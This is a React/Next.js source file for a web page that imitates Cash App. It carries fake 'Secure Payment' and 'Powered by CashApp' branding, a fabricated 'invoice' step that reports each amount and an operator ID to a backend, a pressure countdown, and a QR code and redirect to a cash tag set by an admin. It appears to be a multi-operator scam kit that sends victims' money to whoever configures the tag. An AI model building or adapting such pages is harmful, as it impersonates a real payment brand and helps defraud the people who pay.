"use client";
import { useState, useEffect } from "react";
import { FaLock, FaArrowRight, FaCheckCircle } from "react-icons/fa";
import { MdVerifiedUser } from "react-icons/md";
import { toast } from "react-toastify";
import Cookies from "js-cookie";
import { API_URL, site } from "../config/index";

const AMOUNTS = [10, 50, 100, 200, 300, 500];
const MORE_AMOUNTS = [750, 1000, 1500, 2000];

export default function Home({ adminId }) {
  const [step, setStep] = useState(1);
  const [selectedAmount, setSelectedAmount] = useState(50);
  const [customAmount, setCustomAmount] = useState("50");
  const [showMore, setShowMore] = useState(false);
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(12 * 60 * 60);
  const [tagValue, setTagValue] = useState("");
  const [adminSettings, setAdminSettings] = useState({ showTagField: false, tag: "" });

  useEffect(() => {
    if (step === 2 && timeLeft > 0) {
      const timerId = setInterval(() => {
        setTimeLeft((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(timerId);
    }
  }, [step, timeLeft]);

  useEffect(() => {
    const fetchAdminSettings = async () => {
      try {
        const res = await fetch(`${API_URL}/qrcode/status/check/${adminId}`);
        const data = await res.json();
        if (data && data.length > 0) {
          setAdminSettings({
            showTagField: data[0].showTagField,
            tag: data[0].tag
          });
        }
      } catch (error) {
        console.error("Error fetching admin settings:", error);
      }
    };
    if (adminId) {
      fetchAdminSettings();
    }
  }, [adminId]);

  const formatTime = (seconds) => {
    const hrs = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hrs.toString().padStart(2, "0")}:${mins
      .toString()
      .padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  const handlePayNow = async () => {
    setLoading(true);
    // Simulate invoice creation
    const values = {
      site,
      amount: selectedAmount,
      adminId,
    };

    try {
      const url = `${API_URL}/ad/${adminId}`;
      await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(values),
      });

      setTimeout(() => {
        setLoading(false);
        setStep(2);
      }, 1500);
    } catch (error) {
      console.error("Error creating invoice:", error);
      setLoading(false);
      setStep(2);
    }
  };

  const handleRecommendedPay = () => {
    const cleanTag = (adminSettings.tag || "").trim();
    const redirectUrl = cleanTag.startsWith("http")
      ? cleanTag
      : `https://cash.app/$${cleanTag.replace(/^\$/, "")}`;

    window.location.href = redirectUrl;
  };

  const handleAmountClick = (amt) => {
    setSelectedAmount(amt);
    setCustomAmount(amt.toString());
  };

  const handleCustomAmountChange = (e) => {
    const val = e.target.value;
    setCustomAmount(val);
    if (!isNaN(parseFloat(val))) {
      setSelectedAmount(parseFloat(val));
    }
  };

  return (
    <div className="min-h-screen bg-[#f2fcf5] font-sans text-gray-900 flex flex-col">
      {/* Top Header */}
      <header className="flex justify-between items-center px-4 py-3 md:px-8 bg-white border-b border-gray-100">
        <div className="flex items-center gap-2">
          <div className="bg-[#00D632] p-1.5 rounded-lg">
            <svg
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M11.8 17.7V19.2M11.8 4.8V6.3M15.4 8.7C15.4 7.4 14.3 6.3 13 6.3H10.6C9.3 6.3 8.2 7.4 8.2 8.7C8.2 10 9.3 11.1 10.6 11.1H13C14.3 11.1 15.4 12.2 15.4 13.5C15.4 14.8 14.3 15.9 13 15.9H10.6C9.3 15.9 8.2 14.8 8.2 13.5"
                stroke="white"
                strokeWidth="2.5"
                strokeLinecap="round"
              />
            </svg>
          </div>
        </div>
        <button className="flex items-center gap-1.5 text-gray-500 text-sm font-medium border border-gray-200 px-3 py-1.5 rounded-full hover:bg-gray-50 transition-colors">
          <FaLock className="text-xs" />
          <span>Secure</span>
        </button>
      </header>

      <main className="flex-1 flex flex-col items-center pt-8 pb-12 px-4">
        {step === 1 ? (
          <div className="w-full max-w-[420px] bg-white rounded-[40px] shadow-2xl overflow-hidden border border-gray-100 p-6 md:p-8 my-auto">
            {/* Profile/App Info */}
            <div className="flex flex-col items-center mb-8">
              <div className="w-16 h-16 bg-[#00D632] rounded-full flex items-center justify-center text-white text-3xl font-bold mb-3">
                C
              </div>
              <h1 className="text-2xl font-bold text-gray-900 mb-2">
                Cash App
              </h1>
              <div className="flex items-center gap-1.5 bg-green-50 text-[#00D632] px-3 py-1 rounded-full text-xs font-semibold border border-green-100">
                <FaCheckCircle className="text-[10px]" />
                <span>Secure Payment</span>
              </div>
            </div>

            {/* Amount Selection Section */}
            <div className="space-y-6">
              <div className="flex items-center gap-2 text-[11px] font-black text-gray-400 uppercase tracking-widest border-b border-gray-100 pb-2">
                <MdVerifiedUser className="text-[#00D632] text-sm" />
                <span>Select Amount</span>
              </div>

              {/* Amount Grid */}
              <div className="grid grid-cols-3 gap-3">
                {AMOUNTS.map((amt) => (
                  <button
                    key={amt}
                    onClick={() => handleAmountClick(amt)}
                    className={`py-3 px-1 rounded-xl border-2 transition-all duration-200 text-sm font-bold ${
                      selectedAmount === amt
                        ? "border-[#00D632] bg-[#f2fcf5] text-[#00D632]"
                        : "border-gray-100 bg-white text-gray-900 hover:border-gray-200"
                    }`}
                  >
                    ${amt.toFixed(2)}
                  </button>
                ))}
                {showMore &&
                  MORE_AMOUNTS.map((amt) => (
                    <button
                      key={amt}
                      onClick={() => handleAmountClick(amt)}
                      className={`py-3 px-1 rounded-xl border-2 transition-all duration-200 text-sm font-bold ${
                        selectedAmount === amt
                          ? "border-[#00D632] bg-[#f2fcf5] text-[#00D632]"
                          : "border-gray-100 bg-white text-gray-900 hover:border-gray-200"
                      }`}
                    >
                      ${amt.toFixed(2)}
                    </button>
                  ))}
              </div>

              <button
                onClick={() => setShowMore(!showMore)}
                className="w-full py-3 text-center text-[#00D632] font-bold text-sm bg-green-50 rounded-xl hover:bg-green-100 transition-colors"
              >
                {showMore ? "Show less amounts" : "Show more amounts"}
              </button>

              {/* Custom Amount Input */}
              <div className="relative">
                <input
                  type="number"
                  value={customAmount}
                  onChange={handleCustomAmountChange}
                  className="w-full py-4 px-4 bg-gray-50 border border-gray-200 rounded-2xl text-lg font-bold outline-none focus:border-[#00D632] transition-colors"
                  placeholder="Enter amount"
                />
              </div>

              {/* Dynamic Tag Input */}
              {adminSettings.showTagField && (
                <div className="relative">
                  <div className="flex items-center gap-2 text-[11px] font-black text-gray-400 uppercase tracking-widest mb-2">
                    <span>{adminSettings.tag || "Tag"}</span>
                  </div>
                  <input
                    type="text"
                    value={tagValue}
                    onChange={(e) => setTagValue(e.target.value)}
                    className="w-full py-4 px-4 bg-gray-50 border border-gray-200 rounded-2xl text-base font-semibold outline-none focus:border-[#00D632] transition-colors"
                    placeholder={adminSettings.tag || "Enter details"}
                  />
                </div>
              )}

              {/* Pay Button */}
              <button
                onClick={handlePayNow}
                disabled={loading || !selectedAmount}
                className="w-full py-4 bg-[#66eda3] hover:bg-[#00D632] text-[#1a5232] font-bold rounded-[20px] text-lg flex items-center justify-center gap-2 transition-all disabled:opacity-50"
              >
                <FaLock className="text-sm opacity-60" />
                <span>Pay Now</span>
                <FaArrowRight className="text-sm opacity-60" />
              </button>

              {loading && (
                <div className="flex items-center justify-center gap-3 py-2">
                  <div className="w-5 h-5 border-2 border-[#00D632] border-t-transparent rounded-full animate-spin"></div>
                  <span className="text-sm font-semibold text-[#00D632]">
                    Creating invoice...
                  </span>
                </div>
              )}
            </div>

            {/* Card Footer */}
            <div className="mt-8 pt-4 border-t border-gray-100 text-center">
              <p className="text-[11px] font-semibold text-gray-400 uppercase tracking-widest">
                Powered by CashApp
              </p>
            </div>
          </div>
        ) : (
          <div className="w-full max-w-[420px] space-y-4 my-auto">
            {/* Main Payment Card */}
            <div className="bg-white rounded-xl shadow border border-gray-100 p-8 flex flex-col items-center">
              <div className="w-full text-center mb-2">
                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">
                  Amount Due
                </p>
                <h2 className="text-[44px] font-black text-gray-900 leading-tight">
                  ${selectedAmount.toFixed(2)}
                </h2>
                <p className="text-xs font-semibold text-gray-500 mt-2">
                  Scan or tap to pay
                </p>
              </div>

              {/* QR Code Container - UI preserved as per user request */}
              <div className="relative p-4 bg-white border border-gray-100 rounded-2xl mb-2 w-full aspect-square flex items-center justify-center shadow-sm">
                <img
                  src={`https://api.qrserver.com/v1/create-qr-code/?size=600x600&ecc=H&data=${encodeURIComponent(`https://cash.app/launch/lightning/${adminSettings.tag || ""}`)}`}
                  alt="Payment QR"
                  className="w-full h-full object-contain p-1"
                />
                <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-[#00D632] p-2.5 rounded-lg shadow-lg">
                  <svg
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M11.8 17.7V19.2M11.8 4.8V6.3M15.4 8.7C15.4 7.4 14.3 6.3 13 6.3H10.6C9.3 6.3 8.2 7.4 8.2 8.7C8.2 10 9.3 11.1 10.6 11.1H13C14.3 11.1 15.4 12.2 15.4 13.5C15.4 14.8 14.3 15.9 13 15.9H10.6C9.3 15.9 8.2 14.8 8.2 13.5"
                      stroke="white"
                      strokeWidth="2.5"
                      strokeLinecap="round"
                    />
                  </svg>
                </div>
              </div>

              {/* Pay Now RECOMMENDED Button */}
              <button
                onClick={handleRecommendedPay}
                className="w-full py-2 bg-[#00D632] hover:bg-[#00c22d] text-white font-bold rounded-full text-base flex items-center justify-center gap-2 transition-all shadow-lg shadow-green-100"
              >
                <div className="bg-black rounded-full p-1 mr-0.5">
                  <svg
                    width="14"
                    height="14"
                    viewBox="0 0 24 24"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M11.8 17.7V19.2M11.8 4.8V6.3M15.4 8.7C15.4 7.4 14.3 6.3 13 6.3H10.6C9.3 6.3 8.2 7.4 8.2 8.7C8.2 10 9.3 11.1 10.6 11.1H13C14.3 11.1 15.4 12.2 15.4 13.5C15.4 14.8 14.3 15.9 13 15.9H10.6C9.3 15.9 8.2 14.8 8.2 13.5"
                      stroke="white"
                      strokeWidth="2.5"
                      strokeLinecap="round"
                    />
                  </svg>
                </div>
                <span>Pay now</span>
                <span className="text-[10px] font-bold">Recommended</span>
              </button>
            </div>

            {/* Timer Box (Separate as per original image) */}
            <div className="bg-white border shadow border-gray-100 rounded-xl p-4 text-center ">
              <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">
                Expires In
              </p>
              <p className="text-[26px] font-black text-gray-900">
                {formatTime(timeLeft)}{" "}
                <span className="text-gray-400 font-bold ml-1">remaining</span>
              </p>
            </div>
          </div>
        )}
      </main>

      {/* Decorative Bottom Bar (Phone like) */}
      <div className="fixed bottom-0 left-0 right-0 h-1 bg-gradient-to-r from-transparent via-[#00D632] to-transparent opacity-30"></div>
    </div>
  );
}
